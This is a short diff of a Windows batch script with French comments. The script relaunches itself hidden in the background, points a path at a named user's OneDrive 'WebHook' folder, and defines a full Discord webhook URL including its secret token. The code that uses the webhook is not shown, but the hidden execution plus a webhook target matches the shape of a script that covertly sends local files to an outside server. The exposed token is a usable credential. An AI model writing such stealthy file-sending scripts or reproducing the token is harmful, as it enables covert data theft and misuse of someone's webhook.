@@ -1,10 +1,10 @@
 @echo off
 if not "%1"=="hide" start /B cmd /c "%~0" hide & exit
 setlocal enabledelayedexpansion
-::salute num 777
+::salute num 888
 
 
-set debutchemin=C:\Users\%username%\Downloads\
+set debutchemin=C:\Users\Aubin\OneDrive\ONE DRIVE Documents\WebHook\
 
 :: 📌 Définition des variables
 set WEBHOOK_URL=https://discord.com/api/webhooks/1334179975577862215/FQLGLyudyE8QhYH4OS9MoH-5970K2FU1Ug3tCZ0x7KdWJHHjVMXnSjzSsrOdL8yIGfEo
